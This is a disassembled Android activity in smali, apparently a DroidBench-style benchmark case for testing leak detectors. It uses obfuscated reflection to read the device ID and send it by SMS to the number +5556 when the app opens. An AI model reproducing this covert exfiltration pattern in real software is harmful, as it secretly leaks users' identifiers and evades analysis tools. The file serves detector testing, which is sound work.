.class public Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;
.super Landroid/app/Activity;
.source "ReflectionPrivacyLeak1.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private deobfuscateString(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    .line 48
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    new-array v1, v0, [C

    .line 49
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    if-lt v0, v2, :cond_0

    .line 53
    new-instance p1, Ljava/lang/String;

    invoke-direct {p1, v1}, Ljava/lang/String;-><init>([C)V

    return-object p1

    .line 50
    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v3

    aget-char v4, v3, v0

    add-int/lit8 v2, v4, -0x2

    int-to-char v4, v2

    aput-char v4, v1, v0

    .line 49
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method


# virtual methods
.method public dummyActivityCalls()V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 47

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    .line 14
    invoke-super {v0, v1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const v6, 0x7f030018

    move-object/from16 v0, p0

    invoke-virtual {v0, v6}, Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;->setContentView(I)V

    const-string v8, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v8}, Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    move-object v10, v7

    check-cast v10, Landroid/telephony/TelephonyManager;

    move-object v9, v10

    .line 19
    const-class v11, Landroid/telephony/TelephonyManager;

    :try_start_0
    const-string v8, "igvFgxkegKf"

    move-object/from16 v0, p0

    invoke-direct {v0, v8}, Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;->deobfuscateString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/4 v6, 0x0

    new-array v13, v6, [Ljava/lang/Class;

    invoke-virtual {v11, v12, v13}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v14

    const/4 v6, 0x0

    new-array v15, v6, [Ljava/lang/Object;

    invoke-virtual {v14}, Ljava/lang/reflect/Method;->toGenericString()Ljava/lang/String;

    move-result-object v16

    const-string v8, "public java.lang.String android.telephony.TelephonyManager.getDeviceId()"

    move-object/from16 v0, v16

    invoke-virtual {v0, v8}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-eqz v17, :cond_0

    move-object/from16 v19, v9

    check-cast v19, Landroid/telephony/TelephonyManager;

    move-object/from16 v18, v19

    move-object/from16 v0, v18

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v21, v20

    check-cast v21, Ljava/lang/Object;

    move-object/from16 v7, v21

    goto :goto_0

    .line 20
    :cond_0
    invoke-virtual {v14, v9, v15}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    .line 22
    :goto_0
    move-object/from16 v22, v7

    .line 22
    check-cast v22, Ljava/lang/String;

    .line 22
    move-object/from16 v12, v22

    .line 24
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v23

    const/4 v6, 0x5

    new-array v13, v6, [Ljava/lang/Class;

    const/4 v6, 0x0

    const-class v24, Ljava/lang/String;

    aput-object v24, v13, v6

    const/4 v6, 0x1

    const-class v24, Ljava/lang/String;

    aput-object v24, v13, v6

    const/4 v6, 0x2

    const-class v24, Ljava/lang/String;

    aput-object v24, v13, v6

    const/4 v6, 0x3

    const-class v24, Landroid/app/PendingIntent;

    aput-object v24, v13, v6

    const/4 v6, 0x4

    const-class v24, Landroid/app/PendingIntent;

    aput-object v24, v13, v6

    const/4 v6, 0x5

    new-array v15, v6, [Ljava/lang/Object;

    const-string v8, "49:8"

    move-object/from16 v0, p0

    invoke-direct {v0, v8}, Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;->deobfuscateString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    const/4 v6, 0x0

    aput-object v25, v15, v6

    const/4 v6, 0x1

    const/16 v26, 0x0

    aput-object v26, v15, v6

    const/4 v6, 0x2

    aput-object v12, v15, v6

    const/4 v6, 0x3

    const/16 v26, 0x0

    aput-object v26, v15, v6

    const/4 v6, 0x4

    const/16 v26, 0x0

    aput-object v26, v15, v6

    const-string v8, "ugpfVgzvOguucig"

    move-object/from16 v0, p0

    invoke-direct {v0, v8}, Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;->deobfuscateString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 39
    const-class v11, Landroid/telephony/SmsManager;

    invoke-virtual {v11, v12, v13}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v14

    const/4 v6, 0x0

    aget-object v27, v15, v6

    move-object/from16 v29, v27

    check-cast v29, Ljava/lang/String;

    move-object/from16 v28, v29

    const/4 v6, 0x1

    aget-object v30, v15, v6

    move-object/from16 v32, v30

    check-cast v32, Ljava/lang/String;

    move-object/from16 v31, v32

    const/4 v6, 0x2

    aget-object v33, v15, v6

    move-object/from16 v35, v33

    check-cast v35, Ljava/lang/String;

    move-object/from16 v34, v35

    const/4 v6, 0x3

    aget-object v36, v15, v6

    move-object/from16 v38, v36

    check-cast v38, Landroid/app/PendingIntent;

    move-object/from16 v37, v38

    const/4 v6, 0x4

    aget-object v39, v15, v6

    move-object/from16 v41, v39

    check-cast v41, Landroid/app/PendingIntent;

    move-object/from16 v40, v41

    invoke-virtual {v14}, Ljava/lang/reflect/Method;->toGenericString()Ljava/lang/String;

    move-result-object v42

    const-string v8, "public void android.telephony.SmsManager.sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)"

    move-object/from16 v0, v42

    invoke-virtual {v0, v8}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v43

    if-eqz v43, :cond_1

    move-object/from16 v45, v23

    check-cast v45, Landroid/telephony/SmsManager;

    move-object/from16 v44, v45

    move-object/from16 v0, v44

    move-object/from16 v1, v28

    move-object/from16 v2, v31

    move-object/from16 v3, v34

    move-object/from16 v4, v37

    move-object/from16 v5, v40

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_1

    :cond_1
    move-object/from16 v0, v23

    invoke-virtual {v14, v0, v15}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 45
    :goto_1
    return-void

    .line 41
    :catch_0
    move-exception v46

    move-object/from16 v0, v46

    .line 42
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    return-void
.end method

.method public onRestart()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onRestart()V

    return-void
.end method

.method public onResume()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    invoke-virtual {p0}, Lde/ecspride/reflectionprivacyleak1/ReflectionPrivacyLeak1;->dummyActivityCalls()V

    return-void
.end method

.method public onStart()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    return-void
.end method

.method public onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
